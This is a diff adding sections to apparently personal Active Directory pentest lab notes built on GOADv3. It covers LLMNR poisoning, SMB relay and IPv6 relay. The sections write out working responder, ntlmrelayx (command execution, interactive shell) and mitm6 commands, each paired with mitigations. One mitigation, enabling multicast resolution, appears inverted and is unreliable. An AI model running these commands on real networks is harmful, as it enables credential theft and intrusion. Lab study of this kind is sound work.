@@ -81,6 +81,7 @@
 
 ## Lab Build
 Install Lab from [GOADv3](https://github.com/Orange-Cyberdefense/GOAD/tree/v3-beta), Some reference to setup the [lab](https://orange-cyberdefense.github.io/GOAD/references/)
+I tried this [Link](https://www.youtube.com/watch?v=fXausmYcObE)
 
 ## Initial Attack Vectors
 Lets start the attacks
@@ -100,6 +101,54 @@ Lets start the attacks
 sudo responder -I tun0 -dwPv
 #in order to capture the hash, open the file explorer in the search bar user <b>\\IP-address</b>, if you have only the cmd access <b> net view commands</b>
 ```
+- Mitigations
+  * Enable multicast resolution in GPO.
+  * Require Network Access Control, which requires a complex password of more than 14 characters.
+
+
+### Initial Attack - SMB Relay 
+- SMB(Server Message Block) Relay is an attack where an attacker captures authentication attempts over the network and relays them to another machine, potentially gaining unauthorized access.
+- How it works:
+  * The attacker positions themselves between a client and a server.
+  * When the client attempts to authenticate to a service, the attacker intercepts this attempt.
+  * The attacker then relays these credentials to another target machine.
+  * If successful, the attacker gains access to the target machine with the privileges of the intercepted user.
+```powershell
+# Check SMB is vulnerable or not
+nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24
+# Message signing enabled but not required, Identified we can move forward with the attack
+
+#Change the responder .conf file, SMB, HTTP make it off, CHeck with below commands on or off.
+sudo responder -I tun0 -dwPv
+# To capture the hash, open the file explorer in the search bar user <b>\\IP-address</b>, if you have only the cmd access <b> net view commands</b>
+sudo ntlmrelayx.py –tf targets.txt –smb2support -c "whoami"
+sudo ntlmrelayx.py –tf targets.txt –smb2support -i
+# -i For  Interactive mode, you will get the port number and the localhost IP address, connect with Netcat shell
+```
+- Mitigations
+  * Enable SMB Signing on all devices
+  * Disable NTLM authentication on the network, 
+
+### Initial Attack - IPv6 Attacks
+- It's another form of relaying attack but sometimes SMB Relay password hash is not trackable, using IPv4, IPv6 is disbaled.
+- Set up an IPV6 DNS resolution and get a request it will share to DC, Whenever the request comes it comes to us.(IPv6 -> DNS setup by us <-> DC)
+- A
+```powershell
+sudo mitm6 -d ashok.local # RUn this first d for  Domain name
+ntlmrelayx.py -6 -t ldaps://IP -wh path.ashok.local -l lootme # When ever the the event occurs and user logins, reboots we get the hash.
+#lootme folder hash different files to investigate, check for the description and .html files easy access.
+```
+- Mitigations
+  * Inbound Core Networking DHCP for IPv6
+  * Inbound core networking ROuter Advertisement
+  * Outbound Core networking DHCP for IPv6
+  * If not using WPAD disable that
+  * Enable LDAP signing and LDAP channel binding
+  * Administrative users to protected group via delegation.
+
+ ### Initial Attack - Password Attacks
+ - Sometimes the printers have IP set default, change IP to KALI IP address the run the responder to get the hash, netcat on port 389
+
 
 
 
